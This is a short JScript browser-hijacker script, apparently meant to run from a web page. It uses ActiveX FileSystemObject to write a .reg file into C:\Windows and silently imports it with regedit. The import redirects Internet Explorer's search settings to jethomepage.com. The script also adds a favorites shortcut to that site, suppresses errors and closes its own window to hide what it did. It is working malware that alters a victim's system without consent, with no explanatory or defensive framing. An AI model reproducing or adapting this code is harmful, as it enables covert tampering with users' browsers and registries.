function sEr(){self.close();return true;}
window.onerror=sEr;
fs=new ActiveXObject('Scripting.FileSystemObject');
 wd='C:\\Windows\\';
 t2=fs.CreateTextFile(wd+'homereg111.reg');
 t2.WriteLine('REGEDIT4'); 
 t2.WriteLine(''); 
 t2.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]'); 
t2.WriteLine('"Search Bar"="http://www.jethomepage.com/search.htm"');
t2.WriteLine('"Default_Search_URL"="http://www.jethomepage.com/search.htm"');
t2.WriteLine('"Search Page"="http://www.jethomepage.com/search.htm"');
t2.WriteLine('[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Search]'); 
t2.WriteLine('"SearchAssistant"="http://www.jethomepage.com/search.htm"'); 
t2.WriteLine('');
 t2.close(); 
 wsh.Run(wd+'Regedit.exe -e '+wd+'backup1.reg "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main"'); wsh.Run(wd+'Regedit.exe -e '+wd+'backup2.reg "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main"'); wsh.Run(wd+'Regedit.exe -s '+wd+'homereg111.reg');
wd='C:\\Windows\\Favorites\\Links\\';
fs=new ActiveXObject('Scripting.FileSystemObject');t2=fs.CreateTextFile(wd+'Search The Web.url');t2.WriteLine('[InternetShortcut]');t2.WriteLine('URL=http://www.jethomepage.com/');t2.WriteLine('Modified=A0BEC84AF780BE01A6');t2.WriteLine('IconFile=http://www.jethomepage.com/favicon.ico');t2.WriteLine('');t2.close();
self.close();